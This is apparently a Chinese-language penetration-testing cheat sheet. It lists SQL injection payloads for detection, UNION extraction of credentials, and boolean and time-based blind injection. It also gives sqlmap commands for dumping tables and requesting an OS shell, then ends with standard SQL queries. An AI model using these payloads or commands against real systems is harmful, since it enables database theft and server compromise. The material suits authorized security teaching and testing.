---
title: "SQL注入与数据库查询：渗透测试人员参考手册"
description: "SQL注入载荷、UNION攻击、盲注SQLi技术以及MySQL和PostgreSQL标准数据库查询。面向渗透测试人员和数据库管理员的战术参考。"
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["SQL注入载荷", "MySQL命令速查表", "PostgreSQL速查表", "数据库黑客", "sqlmap命令", "UNION SQL注入", "盲注SQL注入", "SQL注入测试", "数据库枚举", "SQL注入防护"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "SQL注入与数据库查询：渗透测试人员参考手册",
    "description": "SQL注入载荷、UNION攻击、盲注SQLi以及MySQL和PostgreSQL数据库查询。",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "zh-CN"
  }
---

## 系统初始化

SQL注入仍然是最关键的Web应用程序漏洞之一——一直位列OWASP Top 10。当用户输入未经适当清理就直接拼接到SQL查询中时就会发生此漏洞，使攻击者能够操纵数据库查询逻辑。成功的SQL注入可能导致完整的数据泄露、身份验证绕过、权限提升，在某些情况下甚至可以在数据库服务器上远程执行命令。本实战手册提供了授权渗透测试的攻击载荷以及每位数据库管理员需要了解的标准SQL查询。

所有注入技术仅用于授权测试。未经授权的访问是违法的。

---

## SQLi检测

在利用SQL注入漏洞之前，需要确认其存在。检测包括向应用程序参数发送特制输入，并观察响应中的错误消息、行为变化或时间差异。这些初始探测可以告诉您参数是否可注入以及可能的注入类型。

### 基本检测载荷

```sql
-- Single quote test (triggers syntax error if vulnerable)
'

-- Double quote test
"

-- Comment-based detection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Numeric injection test (always true vs always false)
1 OR 1=1
1 AND 1=2

-- String-based detection
' OR 'a'='a
' OR 'a'='a'--

-- Error-based detection (force a type conversion error)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based detection (if the response is delayed, injection exists)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### 识别数据库后端

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## UNION攻击

基于UNION的SQL注入是当错误消息或查询结果显示在页面上时最强大的技术。它通过在原始查询后附加 `UNION SELECT` 语句来工作，允许您从数据库中的任何表提取数据。关键要求是确定原始查询中正确的列数，以便UNION语句匹配。

### 确定列数

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (error at N means there are N-1 columns)

-- Using UNION SELECT with NULL placeholders
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (no error means correct column count)
```

### 提取数据

```sql
-- Find which columns are displayed on the page
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract current database name
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Extract current user
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- List all databases (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in a database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract usernames and passwords
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## 盲注SQL注入

当应用程序不在页面上显示查询结果或错误消息时，您面对的是盲注SQL注入。漏洞仍然存在，但数据提取需要推断——通过布尔条件（页面是否变化？）或时间延迟（响应是否更慢？）。盲注SQLi速度较慢但同样危险。

### 基于布尔的盲注

```sql
-- Test if the first character of the database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test using ASCII values
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Binary search approach (faster than linear)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is it > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- Is it > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- Is it > 'p'?
```

### 基于时间的盲注

```sql
-- MySQL: if condition is true, response is delayed by 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data using time delays
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## SQLMap自动化

SQLMap是自动检测和利用SQL注入的行业标准工具。它处理检测、指纹识别、数据提取，甚至通过SQL注入实现操作系统级访问——全部通过命令行完成。对于授权的渗透测试，它极大地加速了利用阶段。

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## 标准SQL查询

除了注入测试，每位安全专业人员和开发人员都需要了解标准SQL，用于数据库管理、日志分析和调查期间的数据提取。这些查询在MySQL和PostgreSQL上均可使用，涵盖最常见的数据库操作。

### SELECT查询

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### JOIN查询

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT、UPDATE、DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### 数据库管理

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
